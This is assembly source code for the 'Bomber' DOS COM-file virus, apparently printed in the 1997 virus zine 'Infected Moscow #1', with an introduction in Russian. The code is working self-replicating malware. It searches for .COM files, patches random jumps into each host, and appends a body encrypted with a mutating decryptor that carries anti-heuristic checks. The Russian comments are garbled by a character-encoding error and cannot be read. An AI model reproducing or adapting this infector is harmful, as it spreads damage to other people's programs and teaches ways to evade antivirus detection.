COMMENT *
����������������������������������������������������������������������������Ŀ
�INFECTED MOSCOW �#1� JAN'97 �(C)STEALTH Group MoscoW & Co � one@redline.ru  �
������������������������������������������������������������������������������
���������������������������������������������������������������������������Ŀ
� ����� � ��⭠�� � 䠩��                          � (C) Beast/SGBishkek    �
�����������������������������������������������������������������������������


	�� ����� � Beast. 
 ���� �� XT'誮� � ⥬��� ��ன 
 �᪮ଫ���� ��᪠��� ������ ������� . . .
 
 ���� ��૨�� Web'��᪨� ᬮ��� OneHalf. �� ⠬ ��� �ᥣ�� � � � � � �����
� �� ⠪�� ��祥. ��襫 �� ⮣� ��� (O)ne(H)alf (OH) ��⭠ � 䠩�� ��⠢���
� �㬠� � ��祬� ��� ��� ⠪�� �� �� ��� � ����ᠫ ��������� �ணࠬ�� ��
�室���� ����� C-virus. ��� ��� �� ����� �㯮���� �ண� ��ࠦ��� �� com � 
��४�ਨ � �᪨�뢠�� �� ��� 10 ��⥭ �� 6 ���� ����騥 �� Jump'��. ���-
����� ����.��� ⮣� �⮡ �������� ������⢮ ��⥭ ���� �������� HP (᮪�饭��
�� How Patch) �� �������� �᫮. ��� ���⠭������� � ������ ��� ���� ⠡���
����室���� ��� ���⠭�������. ��� �� �ଠ�:

���饭��    ������   �����祭��
   0          1w     ���� ��� ��� ������ (�� ��᪥. �᫨ � �����,� +100h)
   2          6b     �� ᠬ�� �����, � �筥� �ਣ������ �����

 ��⠭�������� HP � ࠧ㬭�� �।���� � ᮢ���� �� 10 �� 15 �� ������ �������
�ࠢ��� ������ ������ �ॡ�� 10h ���� "�����" ���砫� � ����. �� � ⮬�,
�⮡ ���뫮 ��ࠦ����� 䠩��� ������ � 500 ���� � HP = 20. �᫨ 䨫� �����쪮��
ࠧ���, � ��਩ ����� ��横������ �.�. �� ������ ᢮������� ���� � 䠩��.
�� � ������ ������ �ॡ�� 6 ����. ���� �� ���� ����� 0.9 ⠪ ��� �� ������ 
��祣� ����� Jump'�, �� ������ ����� jump'� �ᯮ������ RET, �� �᫮����
����� FUCK'��, �� �� �祭�. ��࠭�஢��� �� 4 - � ���� �� inc si. �.�. ��-
砫� �ண� �������䭮! ��� ⮣� �⮡ �������� ������⢮ ���� � ������ �����-
���� �������� ����⠭�� HB (How Bytes) � �������� � ���� ��� ���-�� १�ࢨ-
�㥬�� ����. ��砫� 㦥 ��������. ��� �஭��� ��ᯮ�� VirMaker'� !
 ��� ��� �᫨ ��� ᮮ��� � ����� ���� ����� � �⮬ ���. ���� ��饭�� ��
�⪮����஢���� ���� ���⠭����� ��� ���, ⠪ ��� com-��१������� 㦥
5-� ���᭨�� �����. � � ���� ���� ������ ��. ��� �� ����� �ᯮ�짮������ ��-
楤�� ��஢�� ��� 䠩�� �� ADinf v1.5. ��������� ���ன WEB ����� ��� ���-
⨧��. ��� ����� �ᮡ��� �� �����࠭���. �.�. ���� ���� ��������樥�
������ (�� ����� �� ��� ����⮥ ��஥) ᯮᮡ� ��ࠦ���� 䠩���. ���� 
���� ��ࠦ���� EXE �ਣ������ ᯮᮡ��. � �� ��饩 �ࠪ���⨪� �� ��।-
��� ��������� �����.

  P.S. �᫨ �� ����� ��쥧��� ��������� � ��楤��� ��ࠦ����, � �� ����� 
� ����ࠩ� � ��楤�� ��ࠦ����.
  
  P.S. ����� ⠡���� ���⠭������� ����� ��������� 㡨ࠩ� � ��㣮� ����
���, �� �� ������ �� ��⨢���᭨��� ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !

*
		.MODEL SMALL
		.CODE
		ORG	100H
BomberCommander:
		JMP	VIRR
		NOP
		DB	'F'
		nop
		nop
		nop
		nop
		nop
		nop
		nop

VIRR:		CALL	$+3
		POP	BP
		SUB	BP,3

                LEA     BX,[BP+NXT_2-VIRR] 	; ����⪠ ������⨪�
                MOV     BYTE PTR CS:[0FBH],9AH
                MOV     WORD PTR CS:[0FCH],BX 
                MOV     WORD PTR CS:[0FEH],DS 
                mov     ax,0fbh                                  
                push    ax                                    
                ret                                           
NXT_2:                                   
;------------------------------------------------
; ���⠭������� 䠩��
;------------------------------------------------
		LEA	SI,[BP+C1_P+2-VIRR]	; SI=㪠�뢠�� �� �ਣ������
						; ����� ��� ��ࢮ�� patch

		MOV	DI,[SI-2]		; DI=offset first patch - 100h
		MOV	CX,HP			; CX=How Patch

RESTOR_LOOP:	ADD	DI,100H			; DI=offset patch

;		MOVSW				; Repair patch
;		MOVSW

		PUSH	CX
		MOV	CX,HB
		REP	MOVSB
		POP	CX

		MOV	DI,[SI]			; DI=offset next patch-100h
		INC	SI
		INC	SI
		LOOP	RESTOR_LOOP		; Repair next PATCH

		mov	ah,2FH
		INT	21H
		PUSH	BX

		MOV	AH,1AH
		LEA	DX,[BP+BUFFER-VIRR]
		INT	21H

		MOV	AH,4EH
		MOV	CX,100111B
		LEA	DX,[BP+FM-VIRR]
NEXT_FILE:
		INT	21H
		JNC	INFECTION
		MOV	AH,1AH
		POP	DX
		INT	21H
		XOR	AX,AX
		PUSH	AX AX AX AX AX AX AX CS	; ���⠭�������� ᥣ�����
		POP	ES SI DI BP AX BX CX DX ; ॣ����� ! ! ! !
		RETF
INFECTION:
		CALL	INFECT			; ��ࠧ��� 䠩�
		MOV	AH,4FH
		LEA	DX,[BP+BUFFER-VIRR]
		JMP	SHORT NEXT_FILE
FM		DB	'*.COM',0

;---------------------------------------------------------
; ��ࠦ����
;---------------------------------------------------------

INFECT:		LEA	DX,[BP+BUFFER-VIRR+1EH]
		MOV	AX,3D00H
		INT	21H
		JNC	$+3
		RET
		PUSH	AX AX
		POP	BX
		MOV	AX,1220H
		INT	2FH
		MOV	BL,BYTE PTR ES:[DI]
		MOV	AX,1216H
		INT	2FH
		POP	BX
		MOV	BYTE PTR ES:[DI+2],2
		MOV	AX,ES:[DI+17]
		CMP	AX,60000
		JA	CLOSE
		CMP	AX,2000
		JB	CLOSE
		MOV	AH,3FH
		MOV	CX,4
		LEA	DX,[BP+C1-VIRR]
		INT	21H
		CMP	BYTE PTR CS:[BP+C1-VIRR],'M'
		JE	CLOSE
		CMP	BYTE PTR CS:[BP+C1-VIRR+3],'F'
		JE	CLOSE

		CALL	CONT_INFECT  ; �த������ ��ࠦ����
		CALL	CRYPT_ALL_FILE
CLOSE:
		MOV	AH,3EH
		INT	21H
		RET
		db	10,13
		db	'(c) Copyright by Beast.',10,13
		db	'(c) Stealth Group Bishkek.',10,13
		db	'(c) Stealth Group World Wide.',10,13

CONT_INFECT:	MOV	CX,HP
		LEA	SI,[BP+C1_P-VIRR]
		MOV	AX,DS:[DI+17]
		CALL	C_B		; ������஢��� HP ���� ��� �����⮪

		CALL	DO_IT_INFECT	; ��������� � 䠩� ����� � patch'���
		RET

DO_IT_INFECT:
		CALL	JMP_WRITE	; ������� �������
		CALL	WRITE_BODY	; ������� ⥫�
		RET

copyright	db	'Infection by Beast. v0.91',10,13   ; �� ������ ! ! !
		db	'Stealth Group World Wide.',0 ; �� ������ ! ! !

WRITE_BODY:	MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	AH,40H
		MOV	DX,BP
		MOV	CX,VL
		INT	21H
		RET

JMP_WRITE:	MOV	CX,HP
		LEA	SI,[BP+C1_P-VIRR]	; ������� � ⥫� �ਣ������
JMP_LOOP:	MOV	AX,[SI]			; ����� � ������� � 䠩� �����-
		MOV	ES:[DI+21],AX		; ��
		INC	SI
		INC	SI
		CALL	GET_COMMAND		; ���࠭��� ��. �����
		MOV	ES:[DI+21],AX

		MOV	AX,[SI+HB]		; Make jmp

		PUSH	AX
		IN	AL,40H
		TEST	AL,1
		POP	AX
		JZ	IT_JMP_C
		XCHG	AL,AH
		INC	AL
		XCHG	AL,AH
		MOV	CS:[RETC-VIRR+1+BP],AX
		PUSH	AX CX DX
		MOV	AH,40H
		LEA	DX,[BP+RETC-VIRR]
		MOV	CX,HB
		INT	21H
		POP	DX CX AX
		JMP	SHORT CONT_SET_JMP
IT_JMP_C:
		SUB	AX,[SI-2]
		SUB	AX,3
		MOV	CS:[BP+JMPC-VIRR+1],AX
		CALL	PUT_COMMAND		; ���ᮢ��� �������
CONT_SET_JMP:
		ADD	SI,HB
		LOOP	JMP_LOOP		; ������騩
		RET

JMPC		DB	0E9H
		DW	?
		DB	'F'
		db	'Hi'


RETC		LABEL	BYTE
		MOV	AX,0
		DB	'F'
		PUSH	AX
		RET

PUT_COMMAND:	PUSH	AX CX DX

		LEA	DX,[BP+JMPC-VIRR]
		MOV	AH,40H
		JMP	SHORT FIN_DOS_INT

GET_COMMAND:	PUSH	AX CX DX
		MOV	AH,3FH
		MOV	DX,SI
FIN_DOS_INT:
		MOV	CX,HB
		INT	21H
		POP	DX CX AX
		RET

;---------------------------------------------------------
; �����஢���� ������ � �㦭�� ���� � �஢�ઠ ��
;---------------------------------------------------------

C_B:		MOV	WORD PTR [SI],0	; ���� 1-�� ������� �ᥣ�� 0
		ADD	SI,HB+2
		DEC	CX
		SUB	AX,10H		; AX=file len-10h �⮡ ������ ������
					; � ����� 䠩�� �� ᠤ�����

CB_LOOP1:	PUSH	AX
ITS_EQUAL:	POP	AX
		PUSH	AX

		MOV	AX,ES:[DI+17]	; look prev. comment 
		SUB	AX,10h

		CALL	GET_RND		; Get random from 0 to AX

		CMP	AX,[SI-HB-2]	; ax=random
		JE	ITS_EQUAL
		CALL	KAK_COCEDU	; �஢�ઠ �� ������� �� �� ������
		JC	ITS_EQUAL	; �� ��㣨�

		MOV	[SI],AX		; Next
		ADD	SI,HB+2
		POP	AX
		LOOP	CB_LOOP1

		MOV	AX,ES:[DI+17]	; ��᫥���� HP+1 ������ �� ���
		MOV	[SI],AX		; � ��室���� �� � ���� 䠩��

		RET

KAK_COCEDU:	PUSH	CX AX SI
		PUSH	AX
		MOV	AX,HP
		SUB	AX,CX
		MOV	CX,AX

;		dec	cx

		POP	AX
		LEA	SI,[BP+C1_P+2+HB-VIRR]

COCEDU_LOOP:	SUB	AX,[SI-HB-2]
		CMP	AX,10H
		JA	$+5
		STC
		JMP	SHORT EXIT_COCEDU
		CMP	AX,0FFE0H
		JB	$+5
		STC
		JMP	SHORT EXIT_COCEDU
		ADD	AX,[SI-2-HB]
		ADD	SI,2+HB
		LOOP	COCEDU_LOOP
		CLC
EXIT_COCEDU:
		POP	SI AX CX
		RET


GET_RND:	PUSH	BX CX
		MOV	BX,AX

		IN	AX,40H
		MOV	CX,AX
GET_AG:
		IN	AX,40H
		CMP	AX,CX
		JE	GET_AG
		SUB	AX,CX
		CMP	AX,100
		JB	GET_AG
		ADD	AX,CX
NXT:
		SUB	AX,BX

;ROL	AX,CL
;add	ax,cx
		CMP	AX,BX
		JAE	NXT
		POP	CX BX
		RET

CRYPT_ALL_FILE:
		CALL	MUTATION    ; �����஢��� ��஢騪 � ����஢騪

		IN	AX,40H
		MOV	WORD PTR DS:[WITH_AX+1-VIRR+bp],AX
		MOV	AX,VL-4
		MOV	DS:[ENCRYPT-VIRR+1+BP],AX
		MOV	AX,VL-3
		MOV	DS:[EN_JMP+1-VIRR+BP],AX
		MOV	AX,ES:[DI+17]
		PUSH	AX
		SUB	AX,VL-100H
		MOV	WORD PTR DS:[WITH_DI+1-VIRR+BP],AX
		DEC	AH
		MOV	ES:[DI+21],AX
		mov	cx,ax
		POP	AX
		PUSH	AX
		PUSH	CX
		MOV	CX,4
		MOV	AH,3FH
		LEA	DX,[VIR_BYTES-VIRR+BP]
		int	21h
		POP	CX
		POP	AX
		PUSH	CX
		MOV	AX,ES:[DI+17]
		MOV	ES:[DI+21],AX
		MOV	CX,EL
		LEA	DX,[ENCRYPT-VIRR+BP]
		MOV	AH,40H
		int	21h
		POP	AX

		MOV	Es:[DI+21],AX
		MOV	AH,40H
		MOV	CX,4
		LEA	DX,[EN_JMP-VIRR+BP]
		int	21h

		mov	cx,vl-4
		mov	ax,ds:[with_ax-virr+1+BP]   ; � AX ��砩��� ���祭��
CRYPT_LOOP:
		CALL	READ_BYTE		 ; ������ ���� �ண�
		LEA	SI,[REZ-VIRR+BP]

;  � �   � � � � � �   � � � � � � � 

		SUB	BYTE PTR [SI],CH
		SUB	BYTE PTR [SI],CL
		SUB	BYTE PTR [SI],AH
		SUB	BYTE PTR [SI],AL

		ADD	BYTE PTR [SI],CH
		ADD	BYTE PTR [SI],CL
		ADD	BYTE PTR [SI],AH
		ADD	BYTE PTR [SI],AL

		XOR	BYTE PTR [SI],CH
		XOR	BYTE PTR [SI],CL


		XOR	BYTE PTR [SI],AH
CRYPT_DATA:
		XOR	BYTE PTR [SI],AL

		CALL	WRITE_BYTE	; ��ꥧ� ����� � ������ ����

CRYPT_DATA1:	ADD	AL,CL

;		ADD	AL,AH
;		ADD	AL,AL
;		ADD	AL,AH

		ADD	AH,CL
;		ADD	AH,AH
;		ADD	AH,AL
;		ADD	AH,AH
;
;		XOR	AL,AH
;		XOR	AL,CL
;		XOR	AL,CH
;
;		XOR	AH,AL
;		XOR	AH,CL
;		XOR	AH,CH
;
;		ROL	AL,CL
;		ROL	AH,CL
;		XCHG	AH,AL
;		ROR	AH,CL
;		ROR	AL,CL
;
		LOOP	CRYPT_LOOP
		RET
;---------------------------------------------------
; �����஢騪 䠩��
;---------------------------------------------------
ENCRYPT:	MOV	CX,0
		CALL	$+3
		POP	SI
		SUB	SI,6

;-------------------------------------------------------------------------------
; ���-���⨪� ��।��� �ࠢ����� ��⪥ NXT_C � �������� � �⥪ CS � 100h
;-------------------------------------------------------------------------------
		LEA	BX,[SI+NXT_C-ENCRYPT]
		MOV	BYTE PTR CS:[0FBH],9AH ; Far call 
		MOV	WORD PTR CS:[0FCH],BX
		MOV	WORD PTR CS:[0FEH],DS
		mov	ax,0fbh
		push	ax
		ret
NXT_C:
		ADD	SI,VIR_BYTES-ENCRYPT

WITH_DI:	MOV	DI,100H
		POP	BP
		PUSH	DI
		MOVSW
		MOVSW
;		MOV	DI,104H

WITH_AX:	MOV	AX,0
		PUSH	AX
		JMP	OUT_COPY
		
		DB	'[Bomber v1.0] by Beast. Stealth Group World Wide.'

OUT_COPY:
;-------------------------------------------------------------------------------
; ��� - ���⨪�
;-------------------------------------------------------------------------------
		SUB	AX,AX
		mov	es,ax
		mov	es:[0],ax
		cmp	es:[0],ax
		je	$+4
		int	20h
;-------------------------------------------------------------------------------
; ��� - ���⨪�
;-------------------------------------------------------------------------------

		mov	ax,0e0e0h
		int	21h
		or	al,0
		jz	$+4
		int	20h
;-------------------------------------------------------------------------------
; ��� - ���⨪�
;-------------------------------------------------------------------------------

		in	al,40h
		or	al,al
		jnz	$+4
		int	20h

		POP	AX
		push	cs
		pop	es
ENCRYPT_LOOP:

;  � �   � � � � � �   � � � � � � �

DECRYPT_DATA:	XOR	BYTE PTR [DI],AL
		XOR	BYTE PTR [DI],AH
		XOR	BYTE PTR [DI],CL
		XOR	BYTE PTR [DI],CH

		SUB	BYTE PTR [DI],AL
		SUB	BYTE PTR [DI],AH
		SUB	BYTE PTR [DI],CL
		SUB	BYTE PTR [DI],CH

		ADD	BYTE PTR [DI],AL
		ADD	BYTE PTR [DI],AH
		ADD	BYTE PTR [DI],CL
		ADD	BYTE PTR [DI],CH


DECRYPT_DATA1:	ADD	AL,CL
;		ADD	AL,AH
;		ADD	AL,AL
;		ADD	AL,AH
;
		ADD	AH,CL
;		ADD	AH,AH
;		ADD	AH,AL
;		ADD	AH,AH
;
;		XOR	AL,AH
;		XOR	AL,CL
;		XOR	AL,CH
;
;		XOR	AH,AL
;		XOR	AH,CL
;		XOR	AH,CH
;
;		ROL	AL,CL
;		ROL	AH,CL
;		XCHG	AH,AL
;		ROR	AH,CL
;		ROR	AL,CL

		INC	DI
		LOOP	ENCRYPT_LOOP
		RETF

VIR_BYTES	DB	90h,90h,90H,0C3h
EL		EQU	$-ENCRYPT

EN_JMP:		DB	0E9h
		DW	?
		DB	'F'
REZ		DB	?

READ_BYTE:	push	ax cx		; �ᯮ������ � ��஢��
		MOV	AH,3FH
		JMP	SHORT FIN_DOS_OP

WRITE_BYTE:	PUSH	AX CX
		MOV	AH,40H
		DEC	WORD PTR ES:[DI+21]
FIN_DOS_OP:
		LEA	DX,[REZ-VIRR+BP]
		MOV	CX,1
		int	21h
		pop	cx ax
		RET

MUTATION:	PUSH	SI DI BX
		MOV	WORD PTR DS:[UP_RND-VIRR+BP],11
		MOV	WORD PTR DS:[DOWN_RND-VIRR+BP],0
		LEA	SI,[DECRYPT_DATA-VIRR+BP]
		MOV	DI,SI
		CALL	GET_RND2	; ������� ��砩��� �᫮
		SHL	BX,1
		PUSH	BX
		ADD	SI,BX
		CALL	GET_RND2	; � ������� ��஥ � � ᮮ�-
		SHL	BX,1		; ����⢨� � ���� ������� � ��஢訪�
		PUSH	BX		; � ����஢騪�
		ADD	DI,BX
		CALL	XCHG_SI_DI
		
		LEA	DI,[CRYPT_DATA-VIRR+BP]
		MOV	SI,DI ;CRYPT_DATA-VIRR-2
		POP	BX
		SUB	DI,BX
		POP	BX
		SUB	SI,BX
		CALL	XCHG_SI_DI

		POP	BX DI SI
		RET

UP_RND		DW	?
DOWN_RND	DW	?

GET_RND2:	IN	AX,40H
		MOV	BX,WORD PTR DS:[UP_RND-VIRR+BP]
		SUB	BX,WORD PTR DS:[DOWN_RND-VIRR+BP]

CONT_RND:	SUB	AX,BX
		CMP	AX,BX
		JA	CONT_RND
		MOV	BX,AX
		RET

XCHG_SI_DI:	PUSH	WORD PTR DS:[DI] ; ������� �������
		PUSH	WORD PTR DS:[SI] ; xchg word ptr [si],word ptr [di]
		POP	WORD PTR DS:[DI]
		POP	WORD PTR DS:[SI]
		RET

HP		EQU	10		; How patch
HB		EQU	6
C1_P		DW	0
C1		DB	0C3h,90h,90h,90H,90H

		db	hp-1 dup (0,0,90h,90h,90h,0c3h,90H,90H)
		DW	0

VL		EQU	$-VIRR
BUFFER:
		END	BomberCommander
